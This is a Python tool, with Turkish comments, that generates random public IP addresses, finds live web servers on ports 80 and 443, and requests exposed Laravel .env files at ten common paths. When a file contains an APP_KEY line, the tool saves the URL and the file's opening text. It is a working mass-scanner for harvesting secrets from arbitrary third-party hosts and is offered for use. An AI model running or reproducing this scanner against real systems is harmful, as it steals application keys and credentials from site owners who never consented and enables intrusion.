import random
import os
import time
import sys
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except:
    os.system("pip3 install requests")
    import requests

try:
    from colorama import Fore, Style
except:
    os.system("pip3 install colorama")
    from colorama import Fore, Style

# SSL uyarılarını devre dışı bırak
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.system('cls' if os.name == 'nt' else 'clear')

def is_local_ip(ip):
    """127.0.0.1, localhost veya özel ağ IP'lerini kontrol et"""
    if ip in ["127.0.0.1", "localhost", "0.0.0.0"]:
        return True
    
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    
    # Özel ağ IP aralıkları
    if parts[0] == '10':  # 10.0.0.0/8
        return True
    if parts[0] == '172' and 16 <= int(parts[1]) <= 31:  # 172.16.0.0/12
        return True
    if parts[0] == '192' and parts[1] == '168':  # 192.168.0.0/16
        return True
    if parts[0] == '169' and parts[1] == '254':  # APIPA
        return True
    
    return False

def gen(brapa):
    """Rastgele IP oluşturur"""
    while True:
        a = random.randint(1, 255)  # 0 ile başlamasın
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 255)  # 0 ile bitmesin
        ip = f"{a}.{b}.{c}.{d}"
        
        # Yerel IP'leri engelle
        if not is_local_ip(ip):
            break
    
    return ip

def genip():
    """Belirtilen sayıda IP oluşturur"""
    try:
        brapa = int(input('How Many IPs to Generate? '))
        if brapa <= 0:
            print(f"{Fore.RED}Please enter a positive number.{Style.RESET_ALL}")
            return
            
        thread_count = min(500, brapa)
        print(f"{Fore.CYAN}Generating {brapa} IPs...{Style.RESET_ALL}")
        
        # Önce dosyayı temizle
        with open('ip.txt', 'w') as f:
            pass
        
        # Toplu yazım için IP listesi
        ip_list = []
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {executor.submit(gen, i): i for i in range(brapa)}
            
            for i, future in enumerate(as_completed(futures)):
                try:
                    ip = future.result()
                    ip_list.append(ip)
                except Exception as e:
                    print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
                
                # İlerleme durumunu göster
                if (i + 1) % max(1, brapa // 20) == 0 or i + 1 == brapa:
                    progress = int((i + 1) / brapa * 100)
                    print(f"\r{Fore.YELLOW}Progress: {progress}%", end='')
        
        # Tüm IP'leri tek seferde yaz
        with open('ip.txt', 'w') as f:
            f.write('\n'.join(ip_list) + '\n')
        
        print(f"\n{Fore.GREEN}[+] SUCCESS! Generated {brapa} IPs in 'ip.txt'{Style.RESET_ALL}")
        print(f"{Fore.CYAN}File location: {os.path.abspath('ip.txt')}{Style.RESET_ALL}")
        
    except ValueError:
        print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def valid_fast(hayuk):
    """Hızlı IP kontrolü - socket ile port tarama"""
    if is_local_ip(hayuk):
        return False
    
    try:
        # Socket ile hızlı bağlantı testi
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.5)  # Kısa timeout
        
        # 80 portunu dene (HTTP)
        result = sock.connect_ex((hayuk, 80))
        sock.close()
        
        if result == 0:  # Port açık
            print(f"{Fore.GREEN}{hayuk} -> LIVE IP{Style.RESET_ALL}")
            with open('liveip.txt', 'a') as f:
                f.write(hayuk + '\n')
            return True
        
        # 443 portunu dene (HTTPS)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.5)
        result = sock.connect_ex((hayuk, 443))
        sock.close()
        
        if result == 0:  # Port açık
            print(f"{Fore.GREEN}{hayuk} -> LIVE IP (HTTPS){Style.RESET_ALL}")
            with open('liveip.txt', 'a') as f:
                f.write(hayuk + '\n')
            return True
            
    except:
        pass
    
    print(f"{Fore.RED}{hayuk} -> DEAD{Style.RESET_ALL}")
    return False

def check_laravel_env(ip):
    """Laravel .env dosyasını kontrol eder - DOĞRU ŞEKİLDE"""
    # Önce IP'yi temizle
    ip = ip.strip()
    if not ip:
        return False
    
    # HTTP ve HTTPS için URL'leri oluştur - DOĞRU FORMAT
    urls_to_check = [
        f"http://{ip}/.env",
        f"https://{ip}/.env",
        f"http://{ip}/public/.env", 
        f"https://{ip}/public/.env",
        f"http://{ip}/laravel/.env",
        f"https://{ip}/laravel/.env",
        f"http://{ip}/app/.env",
        f"https://{ip}/app/.env",
        f"http://{ip}/core/.env",
        f"https://{ip}/core/.env"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }
    
    for url in urls_to_check:
        try:
            response = requests.get(url, headers=headers, timeout=8, 
                                  verify=False, allow_redirects=False)
            
            # .env dosyası bulundu mu kontrol et
            if response.status_code == 200 and "APP_KEY=" in response.text:
                print(f"{Fore.GREEN}{url} -> FOUND .env FILE!{Style.RESET_ALL}")
                with open('laravel_env.txt', 'a') as f:
                    f.write(f"URL: {url}\n")
                    f.write(f"Content (first 200 chars): {response.text[:200]}...\n")
                    f.write('='*50 + '\n')
                return True
                
        except requests.exceptions.SSLError:
            # SSL hatasını görmezden gel, diğer URL'lere devam et
            continue
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except Exception as e:
            # Diğer hataları görmezden gel
            continue
    
    print(f"{Fore.RED}{ip} -> .env NOT FOUND{Style.RESET_ALL}")
    return False

def thread_fast(li, func, result_file, max_threads=200):
    """Hızlı thread fonksiyonu"""
    if not os.path.exists(li):
        print(f"{Fore.RED}File not found: {li}{Style.RESET_ALL}")
        return
    
    # Dosyayı satır satır oku ve boş satırları temizle
    with open(li, 'r') as f:
        ase = [line.strip() for line in f if line.strip()]
    
    total = len(ase)
    if total == 0:
        print(f"{Fore.RED}No valid IPs found in file{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}Processing {total} items...{Style.RESET_ALL}")
    
    # Çıktı dosyasını temizle
    with open(result_file, 'w') as f:
        pass
    
    # Otomatik thread ayarı
    thr = min(max_threads, total // 10 + 10)
    print(f"{Fore.CYAN}Using {thr} threads{Style.RESET_ALL}")
    
    processed = 0
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=thr) as executor:
        futures = {executor.submit(func, item): item for item in ase}
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            
            processed += 1
            if processed % 10 == 0 or processed == total:
                elapsed = time.time() - start_time
                ips_per_sec = processed / elapsed if elapsed > 0 else 0
                print(f"\r{Fore.YELLOW}Processed: {processed}/{total} | Speed: {ips_per_sec:.1f} IP/s", end='')
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.GREEN}[+] Process completed in {elapsed:.1f}s! Results saved to '{result_file}'{Style.RESET_ALL}")

if __name__ == "__main__":
    print(Fore.MAGENTA + r"""
   ______  __  __  _   __  _   __  __  __
  / ____/ / / / / / | / / / | / / / / / /
 / / __  / / / / /  |/ / /  |/ / / / / / 
/ /_/ / / /_/ / / /|  / / /|  / / /_/ /  
\____/  \____/ /_/ |_/ /_/ |_/  \____/                    
""" + '\n')
    
    print(Fore.LIGHTBLUE_EX + '')
    print('(+) 1. IP GENERATOR')
    print('(+) 2. IP CHECKER (FAST)')
    print('(+) 3. LARAVEL .env SCANNER')
    print('(+) 4. Exit' + '\n')

    try:
        pilih = input('Select Options -> ')

        if pilih == '1':
            genip()
        elif pilih == '2':
            diem = input('Input Your IP LIST -> ')
            thread_fast(diem, valid_fast, 'liveip.txt', max_threads=300)
        elif pilih == '3':
            inf = input('Input Your IP LIST -> ')
            thread_fast(inf, check_laravel_env, 'laravel_env.txt', max_threads=100)
        elif pilih == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            exit()
        else:
            print(f'{Fore.RED}Invalid Option!{Style.RESET_ALL}')
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Operation cancelled by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press Enter to exit...{Style.RESET_ALL}")